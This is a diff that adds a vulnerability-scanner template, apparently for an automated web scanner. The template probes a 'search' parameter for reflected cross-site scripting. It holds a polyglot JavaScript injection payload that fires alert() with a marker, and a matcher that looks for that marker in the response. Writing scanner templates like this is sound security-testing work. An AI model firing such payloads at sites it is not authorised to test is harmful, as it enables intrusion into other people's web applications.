@@ -1,0 +1,20 @@
+id: xss2-078
+name: 'Reflected XSS2 ctx-17 via search'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in search'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      search:
+        - 'jaVasCript:/*-/*`/*\`/*''/*"/**/alert(nx2077)//'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx2077'
